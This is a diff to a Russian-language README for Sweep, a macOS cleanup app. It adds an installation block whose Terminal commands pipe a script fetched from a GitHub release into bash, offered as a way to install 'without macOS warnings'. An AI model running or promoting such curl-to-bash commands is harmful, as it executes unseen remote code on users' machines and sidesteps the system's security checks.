@@ -4,6 +4,12 @@
 на Swift 6 / SwiftUI с интерфейсом **Liquid Glass**. Сторонних библиотек нет. Используются только системные фреймворки:
 Foundation, Security, CoreServices, CryptoKit, QuickLookThumbnailing и SQLite из состава macOS.
 
+> **Установка без предупреждений macOS.** Проще всего через [Harbor](../Harbor/) — каталог всех наших приложений.
+> Поставьте его одной командой в Терминале
+> `curl -fsSL https://github.com/parfentsevandrey-blip/test/releases/download/catalog/install.sh | bash`
+> и установите Sweep из каталога: обновления будут приходить сами, данные и настройки сохранятся.
+> Без Harbor: `curl -fsSL https://github.com/parfentsevandrey-blip/test/releases/download/catalog/install.sh | bash -s -- sweep`.
+
 ## Главное — ничего нужного не удалить
 
 Сначала мы разобрали, на что жалуются пользователи CleanMyMac, CCleaner и бесплатных деинсталляторов.
